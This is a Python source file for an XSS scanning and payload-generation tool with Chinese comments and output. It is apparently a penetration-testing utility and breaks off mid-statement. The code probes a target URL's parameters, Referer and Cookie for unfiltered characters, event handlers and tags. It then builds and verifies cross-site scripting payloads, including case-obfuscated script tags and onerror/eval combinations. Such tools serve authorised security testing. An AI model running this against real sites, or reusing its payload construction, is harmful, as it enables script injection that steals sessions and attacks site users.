# coding=utf-8
# Author: Jewel591

import re
import os
import signal
import sys
import threading
import time
import urllib.parse
import requests
from pip._vendor.distlib.compat import raw_input
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



from modules import format, lists
from modules.precheck import PreCheck
from ui.start import Ui_MainWindow
try:
    from PyQt5 import QtCore, QtGui
    from PyQt5.QtCore import *
    from PyQt5.QtWidgets import QApplication, QMainWindow
except:
    print("未安装 PyQt5，无法启动图形化工具")
from data import payload, urldata

time_start = time_end = ""



class MyMainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(MyMainWindow, self).__init__(parent)
        self.setupUi(self)
        # 如果不加 self，tt 只是一个局部变量，当初始化完成，该变量的生命周期就结束了，所以会报 QThread: Destroyed
        self.myworker = Worker()
        self.startx.clicked.connect(lambda: self.myworker.start())
        # 获取控制台输出
        sys.stdout = EmittingStream(textWritten=self.normalOutputWritten)

    def __del__(self):
        # Restore sys.stdout
        sys.stdout = sys.__stdout__

    def normalOutputWritten(self, text):
        """Append text to the QTextEdit."""
        # Maybe QTextEdit.append() works as well, but this is how I do it:
        # cursor = self.textEdit.textCursor()
        cursor = self.output.textCursor()
        # print(cursor)
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.output.setTextCursor(cursor)
        self.output.ensureCursorVisible()


class EmittingStream(QtCore.QObject):
    textWritten = QtCore.pyqtSignal(str)

    def write(self, text):
        self.textWritten.emit(str(text))


class Worker(QThread):
    def __init__(self):
        super(Worker, self).__init__()

    def run(self):
        global time_start, time_end
        time_start = time.time()
        # print("---------开始进行测试---------".rjust(37," "), "\n")
        # urldata.urldata_init()
        # payload.keyword_init()
        if sys.argv[1]=="-x":
            urldata.targetvar = myWin.input_arg.text().strip()
            urldata.targeturl = myWin.input_url.text()
        else:
            urldata.targeturl = input("请输入目标链接(输入 c/C 退出检测)：")
            if urldata.targeturl.lower() == "c":
                print("\033[1;34;8m[!] Canceled by the user\033[0m")
                sys.exit()

            PreCheck.getvars(self)
            print("\n[+] 检测到以下 "+str(len(urldata.targetvarlist))+" 个参数:"+"\n")
            vardic={}
            vardic[0] = ""
            num = 1
            for var2one in urldata.targetvarlist:
                print("["+ str(num) +"] "+var2one)
                vardic[num] = var2one
                num+=1
            while True:
                vardicKey = input("\n请输入目标参数对应序号("+"\033[1;34;8m输入 0 测试 Referer/Cookie 或测试所有参数\033[0m"+")：")
                if not vardicKey.isdigit() or int(vardicKey) not in vardic.keys():
                    print('\n\033[1;31;8m[!] 请输出正确的整数！ \033[0m')
                else:
                    break
            urldata.targetvar = vardic.get(int(vardicKey))
            if int(vardicKey) !=0:
                print("目标参数: ", urldata.targetvar)
            urldata.targetvar = urldata.targetvar.replace(" ", "")

        if len(urldata.targeturl) == 0:
            print('\033[1;32;8m[警告] 请输入待检测链接！ \033[0m')
            return

        begin = PreCheck()
        begin.getvars()
        istargetvarnull = len(urldata.targetvar)
        if len(urldata.targetvar) == 0 and not re.search("(REFERER)", urldata.targeturl) and not re.search("(COOKIE)", urldata.targeturl):
            print("\n"+'\033[1;34;8m[0] 将对所有参数进行测试！ \033[0m'+"\n")
            # print("[+] 将对以下 "+str(len(urldata.targetvarlist))+" 个参数进行测试:"+"\n")
            # for var2one in urldata.targetvarlist:
            #     print("[目标参数] "+var2one)
            time.sleep(1.5)

        for var2tow in urldata.targetvarlist:
            if istargetvarnull == 0:
                urldata.targetvar = var2tow
            if re.search("(REFERER)", urldata.targeturl):
                print('\n'+'\033[1;34;8m[+] 正在测试参数 ' + "Referer" + '\033[0m'+'\n')
            else:
                if re.search("(COOKIE)", urldata.targeturl):
                    print('\n' + '\033[1;34;8m[+] 正在测试参数 ' + "Cookie" + '\033[0m' + '\n')
                else:
                    print('\n'+'\033[1;34;8m[+] 正在测试参数 ' + urldata.targetvar + '\033[0m'+'\n')
            urldata.urldata_init()
            payload.keyword_init()
            begin.rebuildurl()
            begin.checkurlaccessible()
            if urldata.urlsuccess== "no":
                return
            if urldata.urlxssalbe == "no":
                if istargetvarnull > 0:
                    return
                else:
                    continue
            begin2 = CheckStart()
            begin2.check_close()
            begin2.check_action()
            begin2.check_onevent()
            begin2.check_tag()
            begin2.check_combination_close_yes()
            begin2.check_combination_close_no()
            begin2.checkurlaccessibleInTheEnd()
            # begin2.check_illusion()
            # format.breakline()
            time_end = time.time()
            print("\n"+"测试耗时：", time_end - time_start)
            if istargetvarnull > 0:
                return

class CheckStart():

### 闭合符号测试

    def check_close(self):
        format.breakline()
        print("---------闭合测试---------".rjust(37," ")+"\n")
        while urldata.HTTP_METHON == "GET":
            try:
                if re.search(re.escape("�591|ß591"), requests.get(re.sub(re.escape("abcdef1234"),"%df591", urldata.get_url)).content.decode("utf-8","ignore")):  # 使用 re.escape()
                    urldata.unsensitive['close'].append("%df")
                else:
                    urldata.sensitive['close'].append("%df")
            except:
                pass

            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        PreCheck.get_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url),urldata.verbose)):  # 使用 re.escape()
                    urldata.unsensitive['close'].append(pd)
                else:
                    urldata.sensitive['close'].append(pd)
            for i in payload.keyword['close']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()

            if re.search(
                r"/|%2f",
                lists.list_to_str(
                    urldata.unsensitive['close'])):
                for i in payload.keyword['close_tag']:
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(i))),
                            PreCheck.get_response(
                                self,
                                re.sub(
                                    re.escape("abcdef1234"),
                                    i,
                                    urldata.get_url),urldata.verbose)):

                        urldata.unsensitive['close_tag'].append(i)
                    else:
                        urldata.sensitive['close_tag'].append(i)

            print("\n")
            for e in urldata.unsensitive['close']:
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)

            # 将[+] [成功]的闭合字符整体输出
            str591=""
            for e in urldata.unsensitive['close']:
                str591+=e.replace("591", "")
            print("[+] [成功]闭合字符串：", str591)

            for e in urldata.sensitive['close']:
                print("[-] [过滤]：", e.replace("591", ""))
                time.sleep(0.1)
            # [print("[过滤]：", e.replace("591", ""))

            break


        while urldata.HTTP_METHON == "POST":

            def post_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        PreCheck.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data),urldata.verbose)):  # 使用 re.escape()
                    urldata.unsensitive['close'].append(pd)
                else:
                    urldata.sensitive['close'].append(pd)
            for i in payload.keyword['close']:
                mythread = threading.Thread(target=post_start(i))
                mythread.start()

            if re.search(
                r"/|%2f",
                lists.list_to_str(
                    urldata.unsensitive['close'])):
                for i in payload.keyword['close_tag']:
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(i))),
                            PreCheck.post_response(
                                self,
                                re.sub(
                                    re.escape("abcdef1234"),
                                    i,
                                    urldata.post_data),urldata.verbose)):

                        urldata.unsensitive['close_tag'].append(i)
                    else:
                        urldata.sensitive['close_tag'].append(i)

            print("\n")
            for e in urldata.unsensitive['close']:
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)

            #### 将[+] [成功]的闭合字符整体输出
            str591 = ""
            for e in urldata.unsensitive['close']:
                str591 += e.replace("591", "")
            print("[+] [成功]闭合字符串：", str591)

            # human_read.human_read1(url_data.unsensitive)
            # [print("[过滤]：", e.replace("591", ""))
            #  for e in urldata.sensitive['close']]
            for e in urldata.sensitive['close']:
                print("[-] [过滤]：", e.replace("591", ""))
                time.sleep(0.1)


            if urldata.unsensitive['close_tag']:
                payload.keyword['others'] = lists.list_add_start(
                    payload.keyword['others'],
                    lists.list_to_str(
                        urldata.unsensitive['close_tag']).replace("591", ''))
            break

        while urldata.HTTP_METHON == "REFERER":
            def referer_start(pd):
                if re.search(
                        re.escape(
                            urllib.parse.unquote(
                                urllib.parse.unquote(pd))),
                        PreCheck.referer_response(
                            self,pd, urldata.verbose)):  # 使用 re.escape()
                    urldata.unsensitive['close'].append(pd)
                else:
                    urldata.sensitive['close'].append(pd)

            for i in payload.keyword['close']:
                mythread = threading.Thread(target=referer_start(i))
                mythread.start()
            if re.search(
                    r"/|%2f",
                    lists.list_to_str(
                        urldata.unsensitive['close'])):
                for i in payload.keyword['close_tag']:
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(i))),
                            PreCheck.referer_response(
                                self,i, urldata.verbose)):

                        urldata.unsensitive['close_tag'].append(i)
                    else:
                        urldata.sensitive['close_tag'].append(i)

            print("\n")
            for e in urldata.unsensitive['close']:
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)

            # 将[+] [成功]的闭合字符整体输出
            str591 = ""
            for e in urldata.unsensitive['close']:
                str591 += e.replace("591", "")
            print("[+] [成功]闭合字符串：", str591)

            for e in urldata.sensitive['close']:
                print("[-] [过滤]：", e.replace("591", ""))
                time.sleep(0.1)
            break



### 动作测试


    def check_action(self):
        format.breakline()
        print("---------动作测试---------".rjust(37, " ")+"\n")



### 当 GET 时
        while urldata.HTTP_METHON == "GET":

### work 函数
            def get_start(pd):

                # replace("\\\\\\\\","\\\\") 是因为 unicode 编码之后，再使用urllib.parse.unquote（）会变成 8 个\，这时候正则匹配的是 4 个\，实际只需匹配 2 个\，所以要做个replace
                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))).replace("\\\\\\\\","\\\\"), PreCheck.get_response(self, re.sub(re.escape("abcdef1234"), pd, urldata.get_url),urldata.verbose)):
                    urldata.unsensitive['action'].append(pd)
                else:
                    urldata.sensitive['action'].append(pd)




### 执行线程
            for i in payload.keyword['action']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()



### 输出结果
            # [print("[+] [成功]：", e.replace("592", ""))
            print("\n")
            for e in urldata.unsensitive['action']:
                print("[+] [成功]：", e.replace("592", ""))
                time.sleep(0.1)

            # [print("[过滤]：", e.replace("591", ""))
            # for e in urldata.sensitive['action']:
            #     print("[-] [过滤]：", e.replace("591", ""))


            if urldata.unsensitive['action']:
                urldata.signal['action'] = 'yes'
            break




### 当 POST 时

        while urldata.HTTP_METHON == "POST":
            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))



### work 函数
            for i in payload.keyword['action']:
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(i))).replace("\\\\\\\\","\\\\"),
                        PreCheck.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data),urldata.verbose)):  # 使用 re.escape()
                    # print(i.center(170))
                    # print("POST测试：", re.sub(re.escape("abcdef1234"),i,url_data.post_data))
                    # human_read.Dividing_line()
                    urldata.unsensitive['action'].append(i)
                else:
                    urldata.sensitive['action'].append(i)



### 输出结果
            print("\n")
            for e in urldata.unsensitive['action']:  # .replace("591","")优化输出
                print("[+] [成功]：", e.replace("592", ""))
                time.sleep(0.1)

            for e in urldata.sensitive['action']:
                print("[-] [过滤]：", e.replace("591", ""))
                time.sleep(0.1)
            break

        while urldata.HTTP_METHON == "REFERER":

            ### work 函数
            def referer_start(pd):

                # replace("\\\\\\\\","\\\\") 是因为 unicode 编码之后，再使用urllib.parse.unquote（）会变成 8 个\，这时候正则匹配的是 4 个\，实际只需匹配 2 个\，所以要做个replace
                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))).replace("\\\\\\\\", "\\\\"),
                             PreCheck.referer_response(self, pd, urldata.verbose)):
                    urldata.unsensitive['action'].append(pd)
                else:
                    urldata.sensitive['action'].append(pd)

            ### 执行线程
            for i in payload.keyword['action']:
                mythread = threading.Thread(target=referer_start(i))
                mythread.start()

            ### 输出结果
            print("\n")
            for e in urldata.unsensitive['action']:
                print("[+] [成功]：", e.replace("592", ""))
                time.sleep(0.1)

            for e in urldata.sensitive['action']:
                print("[-] [过滤]：", e.replace("591", ""))

            if urldata.unsensitive['action']:
                urldata.signal['action'] = 'yes'
            break

        if "eval" in urldata.unsensitive['action']:
            print("eval(591)+onerror 组合使用，例如 <img src=x onerror=eval(\"alert('xss')\")></img>")

        if urldata.unsensitive['action']:
            urldata.signal['action'] = 'yes'
        # print("url_data.signal.action:", urldata.signal['action'])



### ON 事件测试

    def check_onevent(self):
        format.breakline()
        print("---------事件测试---------".rjust(37, " ")+"\n")
        while urldata.HTTP_METHON == "GET":
            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        PreCheck.get_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url),urldata.verbose)):  # 使用 re.escape()
                    urldata.unsensitive['onevent'].append(pd)
                else:
                    urldata.sensitive['onevent'].append(pd)

            for i in payload.keyword['onevent']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()
            print("\n")
            for e in urldata.unsensitive['onevent']:
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)
            for e in urldata.sensitive['onevent']:
                print("[-] [过滤]：", e.replace("591", ""))
            break
        while urldata.HTTP_METHON == "POST":
            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))
            for i in payload.keyword['onevent']:
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(i))),
                        PreCheck.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data),urldata.verbose)):  # 使用 re.escape()
                    # print(i.center(170))
                    # print("POST测试：", re.sub(re.escape("abcdef1234"),i,url_data.post_data))
                    # human_read.Dividing_line()
                    urldata.unsensitive['onevent'].append(i)
                else:
                    urldata.sensitive['onevent'].append(i)

            print("\n")
            for e in urldata.unsensitive['onevent']:  # .replace("591","")优化输出
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)

            for e in urldata.sensitive['onevent']:
                print("[-] [过滤]：", e.replace("591", ""))
                time.sleep(0.1)
            break
        while urldata.HTTP_METHON == "REFERER":
            def referer_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        PreCheck.referer_response(
                            self,pd,urldata.verbose)):  # 使用 re.escape()
                    urldata.unsensitive['onevent'].append(pd)
                else:
                    urldata.sensitive['onevent'].append(pd)

            for i in payload.keyword['onevent']:
                mythread = threading.Thread(target=referer_start(i))
                mythread.start()
            print("\n")
            for e in urldata.unsensitive['onevent']:
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)
            for e in urldata.sensitive['onevent']:
                print("[-] [过滤]：", e.replace("591", ""))
            break

### 结合输出 on 事件和动作组合
        # print("---------Payload触发动作(展示前5条)---------):".rjust(37, " "))
        # iiss = 1
        # for e1 in urldata.unsensitive['action']:
        #     for e2 in urldata.unsensitive['onevent']:
        #         if e2 !="AcCESsKeY=591":
        #             iiss += 1
        #             if iiss<11:
        #                 print("[!] "+e2.replace("591", "")+e1)
        #                 time.sleep(0.1)

        if urldata.unsensitive['onevent']:
            urldata.signal['onevent'] = 'yes'
        # print("url_data.signal.onevent:", urldata.signal['onevent'])







### 标签测试

    def check_tag(self):
        format.breakline()
        print("---------标签测试---------".rjust(37, " ")+"\n")
        if ">" not in "".join(urldata.unsensitive['close']) and "%3e" not in "".join(urldata.unsensitive['close']) :
            if "<" not in "".join(urldata.unsensitive['close']) and "%3c" not in "".join(urldata.unsensitive['close']):
                print('\033[1;32;8m[警告] < > 标签均被[过滤], 无法插入标签 \033[0m')
                return
            else:
                print('\033[1;32;8m[警告] > 标签被[过滤], < 标签[+] [成功], 能利用 Payload 可能较少 \033[0m')

        keyword_tag = []
        # keyword_tag = payload.keyword['tag']
        if ">" not in "".join(urldata.unsensitive['close']) and "%3e" in "".join(urldata.unsensitive['close']):
            payload.keyword['tag'] = format.payloadReplace(payload.keyword['tag'],">","%3e")
            print('\033[1;37;8m[!] > >>> %3e \033[0m')
        if "<" not in "".join(urldata.unsensitive['close']) and "%3c" in "".join(urldata.unsensitive['close']):
            payload.keyword['tag'] = format.payloadReplace(payload.keyword['tag'],"<","%3c")
            print('\033[1;37;8m[!] < >>> %3c \033[0m')

        while urldata.HTTP_METHON == "GET":
            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        PreCheck.get_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url),urldata.verbose)):  # 使用 re.escape()
                    # print(urldata.unsensitive['tag'])
                    urldata.unsensitive['tag'].append(pd)
                else:
                    urldata.sensitive['tag'].append(pd)

            for i in payload.keyword['tag']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()
            print("\n")
            for e in urldata.unsensitive['tag']:
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)


            for e in urldata.sensitive['tag']:
                print("[-] [过滤]：", e.replace("591", ""))
                time.sleep(0.1)

            break
        while urldata.HTTP_METHON == "POST":
            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))
            for i in payload.keyword['tag']:
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(i))),
                        PreCheck.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data),urldata.verbose)):  # 使用 re.escape()
                    # print(i.center(170))
                    # print("POST测试：", re.sub(re.escape("abcdef1234"),i,url_data.post_data))
                    # human_read.Dividing_line()
                    urldata.unsensitive['tag'].append(i)
                else:
                    urldata.sensitive['tag'].append(i)
            print("\n")
            for e in urldata.unsensitive['tag']:  # .replace("591","")优化输出
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)

            for e in urldata.sensitive['tag']:
                print("[-] [过滤]：", e.replace("591", ""))
                time.sleep(0.1)
            break
        while urldata.HTTP_METHON == "REFERER":
            def referer_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        PreCheck.referer_response(
                            self,pd,urldata.verbose)):  # 使用 re.escape()
                    urldata.unsensitive['tag'].append(pd)
                else:
                    urldata.sensitive['tag'].append(pd)

            for i in payload.keyword['tag']:
                mythread = threading.Thread(target=referer_start(i))
                mythread.start()
            print("\n")
            for e in urldata.unsensitive['tag']:
                print("[+] [成功]：", e.replace("591", ""))
                time.sleep(0.1)


            for e in urldata.sensitive['tag']:
                print("[-] [过滤]：", e.replace("591", ""))
                time.sleep(0.1)

            break
        if urldata.unsensitive['tag']:
            urldata.signal['tag'] = 'yes'
        # print("url_data.signal.tag:", urldata.signal['tag'])






### 组合测试——不闭合标签

    def check_combination_close_no(self):
        format.breakline()
        print("---------组合测试（不闭合标签）---------".rjust(37, " ")+"\n")



### 构造不闭合用的payload：闭合字符+%20+触发动作+%20,并存储到 payload.keyword['combination_close_no']
### 注意，因为是不闭合标签的 payload，所以「闭合字符」只包含'"%22%27,需要提出掉其他字符。

        str591 = ""
        for e in urldata.unsensitive['close']:
            if e =="%22591" or e =="%27591" or e =="\"591" or e=="\'591":
               str591 += e.replace("591", "")
        # 对"和%22 去重
        if "%22" in str591 and "\"" in str591:
            str591 = str591.replace("%22","")
        if "%27" in str591 and "\'" in str591:
            str591 = str591.replace("%27","")

        if re.search(re.escape("onclick"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("accesskey"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
            payload.keyword['combination_close_no'].append(
                str591 + " " + "onclick=" + urldata.unsensitive['action'][0] + " " + "AcCESsKeY=\"j\"" + " " + "nsf=" + str591)
        else:
            print("[!] onclick + accesskey can't use .")
            iiss = 1
            for e1 in urldata.unsensitive['action']:
                for e2 in urldata.unsensitive['onevent']:
                    if iiss < 2 and e2 !="AcCESsKeY=591":
                        if e2=="oNcLIck=591" and "AcCESsKeY=591" in urldata.unsensitive['onevent']:
                            iiss += 1
                            if "\"591" in urldata.unsensitive['close']:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=\"j\""+" "+"nsf="+str591)
                                break
                            if "'591" in urldata.unsensitive['close']:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY='j'"+" "+"nsf="+str591)
                                break
                            if "%22591" in urldata.unsensitive['close']:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=%22j%22"+" "+"nsf="+str591)
                                break
                            if "%27591" in urldata.unsensitive['close']:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=%27j%27"+" "+"nsf="+str591)
                            else:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"nsf="+str591)

                        else:
                            iiss += 1
                            payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"nsf="+str591)
        try:
            if "/591" in urldata.unsensitive['close']:
                payload.keyword['combination_close_no'].append(str591 + ";" + urldata.unsensitive['action'][0] + "//")
            else:
                if "%2f591" in urldata.unsensitive['close']:
                    payload.keyword['combination_close_no'].append(str591 + ";" + urldata.unsensitive['action'][0] + "%2f%2f")
            # if "/591" in urldata.unsensitive['close']:
            #     payload.keyword['combination_close_no'].append(str591 + ";" + urldata.unsensitive['action'][1] + "//")
            # if "%2f591" in urldata.unsensitive['close']:
            #     payload.keyword['combination_close_no'].append(str591 + ";" + urldata.unsensitive['action'][1] + "%2f%2f")
            if "/591" in urldata.unsensitive['close']:
                payload.keyword['combination_close_no'].append(str591 + ";}" + urldata.unsensitive['action'][1] + ";{//")
            else:
                if "%2f591" in urldata.unsensitive['close']:
                    payload.keyword['combination_close_no'].append(str591 + ";}" + urldata.unsensitive['action'][1] + ";{%2f%2f")
        except:
            pass

        print("\n\033[1;34;8m[!] payload 生成（可能需要使用 BurpSuite URL解码）:\033[0m\n")
        # print("payload.keyword['combination_close_no']:")
        for erer in payload.keyword['combination_close_no']:
            print("[!] "+erer)
            time.sleep(0.1)



### 判断是否onevent 和 action 都被[过滤]

        if urldata.signal['action'] == urldata.signal['onevent'] == 'no':
            print("[!] 弹窗函数 和 ON事件 全被[过滤]，不可弹窗，故不再做组合测试".center(7))
            return  # return 退出整个函数
        else:
            pass

        if len(payload.keyword['combination_close_no'])==0:
            print("无可用 Payload! ")
            return

        while urldata.HTTP_METHON == "GET":
            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))).replace(" ", ".*").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
                        PreCheck.get_response(self, re.sub(re.escape("abcdef1234"), pd, urldata.get_url),urldata.verbose)):  # 使用 re.escape()
                    urldata.unsensitive['combination_close_no'].append(pd)
                    print("\n\033[1;32;8mPayload：\033[0m" + re.sub(re.escape("abcdef1234"), pd, urldata.get_url))
                else:
                    urldata.sensitive['combination_close_no'].append(pd)

            for i in payload.keyword['combination_close_no']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()

            # print("\n"+"[!] 自动验证完成")
            print("\n[!] 自动验证可能存在误差，建议对所有组合测试的 payload 做人工验证！")
            print("\n")
            # for e in urldata.unsensitive['combination_close_no']:
            #     print("\n\033[1;32;8mPayload：\033[0m"+re.sub(re.escape("abcdef1234"), e, urldata.get_url))
            #     time.sleep(0.1)

            break



###  POST

        while urldata.HTTP_METHON == "POST":
            def post_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))).replace(" ", ".*").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
                        PreCheck.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.post_data),urldata.verbose)):  # 使用 re.escape()

                    urldata.unsensitive['combination_close_no'].append(pd)
                    print("\n\033[1;32;8mPayload：\033[0m",
                          "(POST)" + re.sub(re.escape("abcdef1234"), pd, urldata.post_data))
                else:
                    urldata.sensitive['combination_close_no'].append(pd)

            for i in payload.keyword['combination_close_no']:
                mythread = threading.Thread(target=post_start(i))
                mythread.start()

            print("\n[!] 自动验证可能存在误差，建议对所有组合测试的 payload 做人工验证！\n")
            # for e in urldata.unsensitive['combination_close_no']:
            #     print("\n\033[1;32;8mPayload：\033[0m", "(POST)"+re.sub(re.escape("abcdef1234"), e, urldata.post_data))
            #     time.sleep(0.1)

            break


        while urldata.HTTP_METHON == "REFERER":
            def referer_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))).replace(" ", ".*").replace("\\\\\\\\","\\\\").replace("\\.*", ".*"),
                        PreCheck.referer_response(self, pd,urldata.verbose)):  # 使用 re.escape()
                    urldata.unsensitive['combination_close_no'].append(pd)
                    print("\n\033[1;32;8mPayload：\033[0m" + pd)
                else:
                    urldata.sensitive['combination_close_no'].append(pd)

            for i in payload.keyword['combination_close_no']:
                mythread = threading.Thread(target=referer_start(i))
                mythread.start()

            print("\n[!] 自动验证可能存在误差，建议对所有组合测试的 payload 做人工验证！\n")
            # for e in urldata.unsensitive['combination_close_no']:
            #     print("\n\033[1;32;8mPayload：\033[0m"+ e )
            #     time.sleep(0.1)

            break


### 组合测试——闭合标签

    def check_combination_close_yes(self):
            format.breakline()
            print("---------组合测试（闭合标签）---------".rjust(37, " ")+"\n")

            ### 判断是否onevent 和 action 都被[过滤]

            if urldata.signal['action'] == urldata.signal['onevent'] == 'no':
                print("[!] 弹窗函数 和 ON事件 全被[过滤]，不可弹窗，故不再做组合测试".center(7))
                return  # return 退出整个函数
            else:
                pass

            ### 构造 payload

            str592 = ""
            for e in urldata.unsensitive['close']:
                if e == "%22591" or e == "%27591" or e == "\"591" or e == "\'591" or e=="/591" or e =="%2f591" or e == ">591" or e =="%3e591":
                    str592 += e.replace("591", "")
            if re.search(re.escape("script"), "".join(urldata.unsensitive['tag']), re.IGNORECASE):
                str592="</ScRipt>"+str592
            print(str(urldata.unsensitive['tag']))
            pdd=[]
            pdd = urldata.unsensitive['tag'][:]
            for pd in pdd:
                if "/" not in pd and pd.replace("591","").replace(" ","")  +"/591" in urldata.unsensitive['tag']:
                    urldata.unsensitive['tag'].remove(pd)
            print(str(urldata.unsensitive['tag']))

            if ">" not in "".join(urldata.unsensitive['tag']) and "%3e" in "".join(urldata.unsensitive['close']):
                payload.keyword['combination_close_yes'] = format.payloadReplace(payload.keyword['combination_close_yes'], ">", "%3e")

            for e1 in urldata.unsensitive['tag']:
                try:
                    if re.search(re.escape("script"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592+"<ScRipt>"+urldata.unsensitive['action'][0]+"</ScRipt>" )

                    if re.search(re.escape("<a>"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592+"<A"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">"+"591</A>" )

                    if re.search(re.escape("input/"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592+"<iNpUt"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")
                    elif re.search(re.escape("input"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592+"<iNpUt"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")

                    if re.search(re.escape("textarea"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592+"<teXtaReA"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")
                    elif re.search(re.escape("textarea"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592+"<teXtaReA"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")

                    if re.search(re.escape("select"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592+"<select"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")
                    elif re.search(re.escape("select"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592+"<select"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")

                    if re.search(re.escape("video"), e1, re.IGNORECASE) and re.search(re.escape("onerror"), "".join(
                            urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<video><source" + "/" + "oNErroR=" + urldata.unsensitive['action'][0] + ">")
                    elif re.search(re.escape("video"), e1, re.IGNORECASE)and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<video><source" + " " + "oNErroR=" +urldata.unsensitive['action'][0] + ">")

                    if re.search(re.escape("img"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
